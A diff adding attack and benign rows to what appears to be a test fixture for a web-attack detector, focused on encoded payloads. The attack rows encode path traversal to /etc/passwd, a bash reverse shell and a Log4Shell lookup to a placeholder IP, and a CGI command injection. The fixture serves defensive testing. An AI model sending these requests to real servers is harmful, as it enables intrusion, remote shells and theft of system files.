@@ -309,3 +309,15 @@ attack	nginx	app	POST	200	700	=medium	/apisix/batch-requests
 attack	nginx	app	GET	200	700	>=high	/x?cmd=os.execute('id')
 attack	nginx	app	GET	200	700	=medium	/api/backup
 attack	nginx	app	POST	400	120	=medium	/mcp_message
+# 编码载荷：Base64 / Hex 编码的片段、路径中用 + 代替空格的注入，解码后再匹配
+attack	encoded	app	GET	404	150	>=high	/download?file=Li4vLi4vLi4vZXRjL3Bhc3N3ZA==
+attack	encoded	app	GET	404	150	>=high	/files/Li4vLi4vLi4vd2luZG93cy93aW4uaW5p
+attack	encoded	app	GET	404	150	>=high	/api/run?c=YmFzaCAtaSA%2BJiAvZGV2L3RjcC8xLjIuMy40LzQ0NDQgMD4mMQ%3D%3D
+attack	encoded	app	GET	404	150	>=high	/read?file=2e2e2f2e2e2f2e2e2f6574632f706173737764
+attack	encoded	app	GET	200	5000	>=high	/x?u=JHtqbmRpOmxkYXA6Ly8xLjIuMy40OjEzODkvYX0=
+attack	encoded	app	GET	404	150	>=high	/cgi-bin/test.cgi;cat+/etc/passwd
+benign	encoded	app	GET	200	5000	none	/api/v1/me?token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
+benign	encoded	app	GET	302	0	none	/login?return=aHR0cHM6Ly93d3cuZXhhbXBsZS5jb20vYWNjb3VudC9vcmRlcnM%3D
+benign	encoded	app	GET	200	5000	none	/api/items?cursor=eyJpZCI6MTIzNDUsInRzIjoxNzAwMDAwMDAwfQ&limit=20
+benign	encoded	app	GET	200	5000	none	/files/8f14e45fceea167a5a36dedd4abac8f6/report.pdf
+benign	encoded	app	GET	200	5000	none	/products/2026+spring+collection
